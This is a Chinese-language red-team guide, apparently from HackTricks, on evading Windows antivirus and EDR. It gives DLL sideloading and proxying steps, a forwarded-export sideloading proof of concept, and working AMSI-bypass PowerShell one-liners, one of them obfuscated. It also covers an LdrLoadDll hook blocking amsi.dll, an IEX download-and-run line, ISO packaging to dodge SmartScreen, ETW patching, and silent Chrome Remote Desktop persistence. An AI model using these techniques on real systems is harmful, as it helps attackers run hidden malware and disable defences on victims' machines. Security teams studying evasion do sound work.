# 杀毒软件 (AV) 绕过

{{#include ../banners/hacktricks-training.md}}

**本页面由** [**@m2rc_p**](https://twitter.com/m2rc_p)**撰写！**

## 停止 Defender

- [defendnot](https://github.com/es3n1n/defendnot): 用于停止 Windows Defender 工作的工具。
- [no-defender](https://github.com/es3n1n/no-defender): 通过伪装成另一个 AV 来停止 Windows Defender 工作的工具。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV 绕过方法论**

目前，AVs 使用不同的方法来判断文件是否为恶意文件：静态检测、动态分析，以及对于更高级的 EDRs，还有行为分析。

### **Static detection**

静态检测是通过标记二进制或脚本中已知的恶意字符串或字节数组来实现的，同时还会从文件本身提取信息（例如 file description、company name、digital signatures、icon、checksum 等）。这意味着使用已知的公共工具更容易被发现，因为它们很可能已被分析并被标记为恶意。有几种绕过这类检测的方法：

- **Encryption**

如果你对二进制进行加密，AV 将无法检测到你的程序，但你需要某种 loader 在内存中解密并运行该程序。

- **Obfuscation**

有时候你只需更改二进制或脚本中的一些字符串即可绕过 AV，但这可能是一个耗时的工作，取决于你试图混淆的内容。

- **Custom tooling**

如果你开发自己的工具，就不会有已知的恶意签名，但这需要大量时间和精力。

> [!TIP]
> 检查 Windows Defender 静态检测的一个好方法是 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上将文件拆分为多个片段，然后让 Defender 单独扫描每个片段，这样就能准确告诉你二进制中被标记的字符串或字节是什么。

强烈推荐查看这个关于实用 AV 绕过的 [YouTube 播放列表](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)。

### **Dynamic analysis**

动态分析是指 AV 在沙箱中运行你的二进制并观察是否有恶意行为（例如尝试解密并读取浏览器密码、对 LSASS 进行 minidump 等）。这部分可能更难对付，但你可以采取以下一些措施来规避沙箱。

- **在执行前休眠** 根据沙箱的实现方式，这可能是绕过 AV 动态分析的好方法。AV 为了不打断用户工作流，扫描文件的时间通常很短，所以使用较长的休眠可以扰乱二进制的分析。但问题是，许多 AV 的沙箱可以根据实现方式跳过休眠。
- **检查机器资源** 通常沙箱可用的资源非常有限（例如 < 2GB RAM），否则会拖慢用户的机器。你也可以在这里发挥创意，例如检查 CPU 温度或风扇转速，沙箱未必实现所有这些检测。
- **机器特定检查** 如果你想攻击一台加入了 "contoso.local" 域的工作站，你可以检查计算机的域是否与指定的匹配，如果不匹配，可以让程序退出。

事实证明 Microsoft Defender 的 Sandbox 计算机名是 HAL9TH，因此在触发之前可以检查机器名，如果为 HAL9TH，说明你处在 Defender 的沙箱中，就可以让程序退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>来源: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

以下是来自 [@mgeeky](https://twitter.com/mariuszbit) 关于对抗沙箱的一些非常好的建议

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

正如我们在本帖前面所说，**public tools** 最终会被 **get detected**，所以你应该问自己一个问题：

例如，如果你想 dump LSASS，**你真的需要使用 mimikatz 吗**？还是可以使用一个不太知名但也能 dump LSASS 的其他项目。

正确的答案很可能是后者。以 mimikatz 为例，它可能是 AVs 和 EDRs 标记最多的工具之一，虽然该项目本身很棒，但在绕过 AV 时非常难处理，所以只要寻找替代方案以实现你的目标即可。

> [!TIP]
> 在为绕过而修改你的 payloads 时，确保在 Defender 中**关闭自动样本提交**，并且请认真对待，**不要上传到 VIRUSTOTAL**（DO NOT UPLOAD TO VIRUSTOTAL），如果你的目标是长期实现绕过的话。如果你想检查某个 AV 是否会检测到你的 payload，在 VM 上安装该 AV，尝试关闭自动样本提交，然后在该环境中测试，直到你满意为止。

## EXEs vs DLLs

只要可能，始终**优先使用 DLLs 来进行绕过**，根据我的经验，DLL 文件通常**被检测和分析的概率远低于 EXE**，所以在某些情况下（如果你的 payload 可以以 DLL 形式运行）这是一个非常简单的规避技巧。

如图所示，Havoc 的 DLL payload 在 antiscan.me 的检测率为 4/26，而 EXE payload 的检测率为 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me 对比：普通 Havoc EXE payload vs 普通 Havoc DLL</p></figcaption></figure>

下面我们将展示一些可以与 DLL 文件配合使用以提高隐蔽性的技巧。

## DLL Sideloading & Proxying

**DLL Sideloading** 利用 loader 使用的 DLL 搜索顺序，通过将受害应用程序和恶意 payload 放置在一起实现旁路。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和下面的 powershell 脚本来检测易受 DLL Sideloading 影响的程序：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
此命令将输出位于 "C:\Program Files\\" 中易受 DLL hijacking 的程序列表，以及它们尝试加载的 DLL 文件。

我强烈建议你 **explore DLL Hijackable/Sideloadable programs yourself**。如果正确实施，这种技术相当隐蔽，但如果使用公开已知的 DLL Sideloadable 程序，可能很容易被发现。

仅仅放置一个具有程序期望加载名称的恶意 DLL 并不会加载你的 payload，因为程序期望该 DLL 内包含一些特定的函数。为了解决这个问题，我们将使用另一种技术，称为 **DLL Proxying/Forwarding**。

**DLL Proxying** 将程序从代理（及恶意）DLL 发出的调用转发到原始 DLL，从而保留程序功能并能够处理你的 payload 的执行。

我将使用 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目，来自 [@flangvik](https://twitter.com/Flangvik/)

以下是我遵循的步骤：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一个命令会给我们两个文件：一个 DLL 源代码模板，以及原始重命名的 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
这些是结果：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和 proxy DLL 在 [antiscan.me](https://antiscan.me) 的检测率都是 0/26！我会称之为成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### 滥用 Forwarded Exports (ForwardSideLoading)

Windows PE 模块可以导出实际上是 "forwarders" 的函数：导出条目不指向代码，而是包含形式为 `TargetDll.TargetFunc` 的 ASCII 字符串。当调用者解析该导出时，Windows 加载器将会：

- 加载 `TargetDll`（如果尚未加载）
- 从中解析 `TargetFunc`

需要理解的关键行为：
- 如果 `TargetDll` 是 KnownDLL，则它从受保护的 KnownDLLs 命名空间提供（例如，ntdll、kernelbase、ole32）。
- 如果 `TargetDll` 不是 KnownDLL，则使用常规的 DLL 搜索顺序，其中包括执行转发解析的模块所在的目录。

这启用了一个间接的 sideloading 原语：找到一个已签名的 DLL，该 DLL 导出一个被转发到非 KnownDLL 模块名的函数，然后将该已签名的 DLL 与一个由攻击者控制、且名称与转发目标模块完全相同的 DLL 放在同一目录。当转发的导出被调用时，加载器会解析该转发并从同一目录加载你的 DLL，执行你的 DllMain。

在 Windows 11 上观察到的示例：
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` 不是 KnownDLL，因此会按照常规搜索顺序解析。

PoC (copy-paste):
1) 复制签名的系统 DLL 到一个可写的文件夹
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 在相同的文件夹中放置一个恶意的 `NCRYPTPROV.dll`。一个最小的 DllMain 就足以实现代码执行；你不需要实现转发函数就能触发 DllMain。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 使用已签名的 LOLBin 触发转发：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32（已签名）加载并排的 `keyiso.dll`（已签名）
- 在解析 `KeyIsoSetAuditingInterface` 时，加载器会跟随转发到 `NCRYPTPROV.SetAuditingInterface`
- 随后，加载器从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果 `SetAuditingInterface` 未实现，只有在 `DllMain` 已经运行之后你才会收到 "missing API" 错误

Hunting tips:
- 关注目标模块不是 KnownDLL 的转发导出。KnownDLLs 列在 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 下。
- 你可以使用如下工具枚举转发导出：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder 清单以搜索候选项: https://hexacorn.com/d/apis_fwd.txt

检测/防御建议:
- 监视 LOLBins (例如 rundll32.exe) 从非系统路径加载签名 DLL，然后从该目录加载具有相同基名的非-KnownDLLs
- 对如下进程/模块链发出警报: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` 位于用户可写路径下
- 强制执行代码完整性策略 (WDAC/AppLocker)，并在应用程序目录中禁止写入+执行

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

你可以使用 Freeze 以隐蔽的方式加载并执行你的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion 是一个猫捉老鼠的游戏，今天有效的方法明天可能会被检测到，所以不要只依赖单一工具，若可能，尽量串联多种 evasion techniques。

## AMSI (反恶意软件扫描接口)

AMSI 是为防止 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" 而创建的。最初，AVs 只能扫描 **files on disk**，因此如果你能以某种方式将 payloads **directly in-memory** 执行，AV 就无法阻止，因为其可视性不足。

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

它允许防病毒解决方案通过以未加密且未混淆的形式暴露脚本内容来检查脚本行为。

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意它如何在前面加上 `amsi:`，然后是执行脚本的可执行文件路径，在本例中为 powershell.exe。

我们没有将任何文件写入磁盘，但仍然因为 AMSI 在内存中扫描而被检测到。

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

有几种方法可以绕过 AMSI：

- **Obfuscation**

由于 AMSI 主要基于静态检测，因此修改你尝试加载的脚本可能是规避检测的一个好方法。

然而，AMSI 有能力对脚本进行去混淆（即使存在多层混淆），所以 obfuscation 的效果取决于具体实现，可能并不是一个好选项。这使得规避并不那么简单。不过，有时仅仅改几个变量名就足够了，所以这取决于该脚本被标记的程度。

- **AMSI Bypass**

由于 AMSI 是通过将一个 DLL 注入到 powershell（以及 cscript.exe、wscript.exe 等）进程来实现的，即使以非特权用户身份运行，也可以相对容易地篡改它。由于 AMSI 实现中的这个缺陷，研究人员已经发现了多种规避 AMSI 扫描的方法。

**Forcing an Error**

强制 AMSI 初始化失败（amsiInitFailed）将导致当前进程不发起任何扫描。最初这是由 Matt Graeber 披露的，Microsoft 已经开发了签名以防止更广泛的使用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
只需一行 powershell 代码就能使当前 powershell 进程中的 AMSI 无法使用。这行代码当然已被 AMSI 本身检测到，因此需要对其进行一些修改才能使用该技术。

下面是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 取得并修改的一个 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
请注意，一旦这篇文章发布，很可能会被标记（flagged），因此如果你的目标是保持不被发现，就不要发布任何 code。

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获得更详细的说明。

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

实现大纲（x64 C/C++ 伪代码）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
注意事项
- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
- 将其与通过 stdin 提供脚本（`PowerShell.exe -NoProfile -NonInteractive -Command -`）配合使用，以避免长命令行痕迹。
- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**移除检测到的签名**

你可以使用像 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 这样的工具，从当前进程的内存中移除检测到的 AMSI 签名。该工具通过扫描当前进程的内存寻找 AMSI 签名，然后用 NOP 指令覆盖它，从而将其从内存中移除。

**使用 AMSI 的 AV/EDR 产品**

你可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 找到使用 AMSI 的 AV/EDR 产品列表。

**使用 PowerShell 版本 2**
如果你使用 PowerShell 版本 2，AMSI 不会被加载，因此你可以在不被 AMSI 扫描的情况下运行脚本。你可以这样做：
```bash
powershell.exe -version 2
```
## PS 日志记录

PowerShell 日志记录是一个功能，允许你记录系统上执行的所有 PowerShell 命令。这对于审计和故障排除很有用，但对于想要规避检测的攻击者来说也可能是个**问题**。

要绕过 PowerShell 日志记录，可以使用以下技术：

- **Disable PowerShell Transcription and Module Logging**：你可以使用像 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 这样的工具来实现此目的。
- **Use Powershell version 2**：如果使用 PowerShell 版本 2，AMSI 将不会被加载，因此你可以运行脚本而不被 AMSI 扫描。可以这样做：`powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**：使用 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 来生成一个没有防御的 powershell（这也是 `powerpick` 来自 Cobal Strike 使用的）。


## Obfuscation

> [!TIP]
> 几种混淆技术依赖于加密数据，这会增加二进制的熵，从而使 AVs 和 EDRs 更容易检测到它。对此要小心，或许只对代码中敏感或需要隐藏的特定部分应用加密。

### Deobfuscating ConfuserEx-Protected .NET Binaries

在分析使用 ConfuserEx 2（或商业分支）的恶意软件时，通常会遇到多层保护，这些保护会阻止反编译器和沙箱。下面的工作流程可以可靠地**恢复接近原始的 IL**，随后可以在 dnSpy 或 ILSpy 等工具中反编译为 C#。

1.  Anti-tampering removal – ConfuserEx 会加密每个 *method body* 并在 *module* 静态构造函数 (`<Module>.cctor`) 内解密。它还会修补 PE 校验和，因此任何修改都会导致二进制崩溃。使用 **AntiTamperKiller** 定位被加密的元数据表，恢复 XOR 密钥并重写一个干净的程序集：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
输出包含 6 个 anti-tamper 参数（`key0-key3`, `nameHash`, `internKey`），在构建你自己的 unpacker 时可能有用。

2.  Symbol / control-flow recovery – 将 *clean* 文件喂给 **de4dot-cex**（一个支持 ConfuserEx 的 de4dot 分支）。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
标志：
• `-p crx` – 选择 ConfuserEx 2 配置文件  
• de4dot 将撤销 control-flow flattening，恢复原始的命名空间、类和变量名并解密常量字符串。

3.  Proxy-call stripping – ConfuserEx 用轻量级包装器（亦称 *proxy calls*）替换直接方法调用以进一步破坏反编译。使用 **ProxyCall-Remover** 将其移除：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
在此步骤之后，你应能看到常见的 .NET API，如 `Convert.FromBase64String` 或 `AES.Create()`，而不是那些不透明的包装函数（如 `Class8.smethod_10` 等）。

4.  Manual clean-up – 在 dnSpy 中运行结果二进制，搜索大型 Base64 数据块或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用以定位*真实*载荷。通常恶意软件将其作为 TLV 编码的字节数组初始化在 `<Module>.byte_0` 中。

上述链条在**不需要**运行恶意样本的情况下恢复执行流——这在离线工作站上工作时很有用。

> 🛈  ConfuserEx 会生成一个名为 `ConfusedByAttribute` 的自定义属性，可用作 IOC 来自动分类样本。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 本项目旨在提供 [LLVM](http://www.llvm.org/) 编译套件的开源分支，通过 code obfuscation 提高软件安全性并实现防篡改。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示如何使用 `C++11/14` 在编译时生成 obfuscated code，而无需使用任何外部工具或修改编译器。
- [**obfy**](https://github.com/fritzone/obfy): 通过 C++ template metaprogramming framework 添加一层 obfuscated operations，使想要破解应用的人更为困难。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 binary obfuscator，能够对各种 pe 文件进行 obfuscate，包括：.exe、.dll、.sys
- [**metame**](https://github.com/a0rtega/metame): Metame 是一个用于任意可执行文件的简单 metamorphic code engine。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个针对 LLVM-supported languages 的细粒度 code obfuscation 框架，使用 ROP (return-oriented programming)。ROPfuscator 在汇编级别通过将常规指令转换为 ROP chains 来对程序进行 obfuscate，从而破坏我们对正常控制流的直观理解。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有 EXE/DLL 转换为 shellcode 并加载它们

## SmartScreen & MoTW

你可能在从互联网下载并执行某些可执行文件时见过这个屏幕。

Microsoft Defender SmartScreen 是一种旨在保护最终用户免于运行潜在恶意应用程序的安全机制。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要采用基于信誉的方式运作，这意味着不常被下载的应用会触发 SmartScreen，从而提醒并阻止最终用户执行该文件（尽管仍可通过点击 More Info -> Run anyway 来执行该文件）。

**MoTW** (Mark of The Web) 是一个名为 Zone.Identifier 的 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，在从互联网下载文件时会自动创建，其中包含下载来源的 URL。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>检测从互联网下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>

> [!TIP]
> 值得注意的是，使用**受信任**签名证书签署的可执行文件**不会触发 SmartScreen**。

防止你的 payloads 被附加 Mark of The Web 的一个非常有效的方法是将它们打包到某种容器中（例如 ISO）。这是因为 Mark-of-the-Web (MOTW) **cannot** 应用于 **non NTFS** 卷。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payloads 打包到输出容器以规避 Mark-of-the-Web 的工具。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一个强大的日志机制，允许应用程序和系统组件 **记录事件**。然而，它也可以被安全产品用来监控和检测恶意活动。

类似于禁用（绕过）AMSI 的方式，也可以使用户态进程的 **`EtwEventWrite`** 函数立即返回而不记录任何事件。这是通过在内存中打补丁使该函数立即返回来实现的，从而有效地禁用该进程的 ETW 日志记录。

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

在内存中加载 C# 二进制文件已经流行一段时间，仍然是运行 post-exploitation 工具而不被 AV 检测的非常好的方法。

由于 payload 会直接加载到内存而不触及磁盘，我们只需要为整个进程修补 AMSI。

大多数 C2 框架（sliver、Covenant、metasploit、CobaltStrike、Havoc 等）已经提供了直接在内存中执行 C# assemblies 的能力，但有不同的实现方式：

- **Fork\&Run**

它涉及**生成一个新的牺牲进程**，将你的 post-exploitation 恶意代码注入到该新进程，执行恶意代码，完成后终止该进程。此方法有其优缺点。Fork & Run 的优点是执行发生在我们的 Beacon 植入进程**之外**。这意味着如果我们的 post-exploitation 操作出错或被发现，我们的 **implant** 存活的可能性会大得多。缺点是更有可能被 **Behavioural Detections** 捕获。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

它是把 post-exploitation 恶意代码注入到**自身进程**中。这样可以避免创建新进程并被 AV 扫描，但缺点是如果 payload 执行出错，可能会更大概率**丢失你的 beacon**（因为进程可能崩溃）。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果你想进一步阅读关于 C# Assembly 加载的内容，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

你也可以**从 PowerShell**加载 C# Assemblies，参考 Invoke-SharpLoader（https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader）和 S3cur3th1sSh1t 的视频（https://www.youtube.com/watch?v=oe11Q-3Akuk）。

## Using Other Programming Languages

如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 所述，可以通过让被攻陷机器访问 **部署在攻击者控制的 SMB 共享上的解释器环境**，使用其他语言执行恶意代码。

通过允许访问 SMB 共享上的解释器二进制文件和环境，你可以在被攻陷机器的内存中**以这些语言执行任意代码**。

该仓库指出：Defender 仍然会扫描脚本，但通过利用 Go、Java、PHP 等，我们在**绕过静态签名**方面有更多灵活性。用这些语言的随机未混淆反向 shell 脚本进行测试已被证明是成功的。

## TokenStomping

Token stomping 是一种技术，允许攻击者**操纵 access token 或像 EDR 或 AV 这样的安全产品**，从而降低其权限，使进程不会被终止，但没有权限去检查恶意活动。

为防止这种情况，Windows 可以**阻止外部进程**获取安全进程的 token 句柄。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

如 [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 所述，在受害者电脑上部署 Chrome Remote Desktop 并利用它接管并维持持久访问是很容易的：
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 的 MSI 文件进行下载。
2. 在受害者机器上以静默方式运行安装程序（需要管理员）： `msiexec /i chromeremotedesktophost.msi /qn`
3. 返回 Chrome Remote Desktop 页面并点击下一步。向导会要求你授权；点击 Authorize 按钮继续。
4. 执行给定参数并做相应调整： `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` （注意 pin 参数允许在不使用 GUI 的情况下设置 PIN。）

## Advanced Evasion

规避是一个非常复杂的话题，有时在单个系统中就必须考虑多种不同的遥测来源，因此在成熟环境中完全不被检测到几乎不可能。

每个你面对的环境都有其自身的优劣势。

我强烈建议你观看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这场演讲，以便入门更多 Advanced Evasion 技术。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这也是 [@mariuszbit](https://twitter.com/mariuszbit) 关于 Evasion in Depth 的另一场精彩演讲。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**逐步移除二进制的部分内容**，直到**找出 Defender 认为是恶意的那一部分**并分离出来。\
